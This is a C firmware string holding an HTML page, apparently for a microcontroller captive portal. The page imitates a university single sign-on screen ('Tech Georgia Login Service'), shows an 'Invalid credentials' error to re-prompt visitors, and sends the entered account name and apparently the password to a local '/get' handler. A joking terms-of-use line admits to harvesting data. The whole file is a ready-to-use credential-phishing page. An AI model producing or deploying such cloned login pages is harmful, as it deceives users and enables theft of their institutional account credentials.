const char invalid_pass_index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html class=" js no-mobile desktop no-ie ff ff106 cas-section w-1680 gt-240 gt-320 gt-480 gt-640 gt-768 gt-800 gt-1024 gt-1280 gt-1440 lt-1920 no-portrait landscape gradient rgba opacity textshadow multiplebgs boxshadow borderimage borderradius no-cssreflections csstransforms csstransitions no-touch retina fontface domloaded" id="login-page"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>TG | TG Login</title>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style type="text/css">
        
    </style><!--[if gte IE 9]><!--><style tyep="text/css">meta.foundation-version {
    font-family: "/5.5.2/"
}
...
<div id="prefooter">
    <header>
    <div id="identity">
        <h1 id="site-title">Tech Georgia Login Service</h1>
    </div>
...
<section id="main">
        ...
        <div id="cas-content">
            <form action="/get" id="fm1">
    <div class="errors">
        <span>Invalid credentials.</span>
    </div>
    <div class="row">
        <div class="box" id="login">
            <h2>Enter your TG Account and Password</h2>
            ...
            <![endif]--><section>
                <label for="username"><span class="accesskey">T</span>G Account:</label>

                <div>
                    <input class="required" id="username" size="25" tabindex="1" type="text" accesskey="u" autocomplete="off" name="username"></div>
            </section>
            ...
            <section class="btn-row buttons">
                <input class="btn btn-submit button" name="submit" value="Submit" type="submit"></section>
        </div>
    ...
    <p>
        <b>TERMS OF USE</b><br>
        By using this service, you agree to us harvesting your data, your soul, and your bank account. 
        <br>
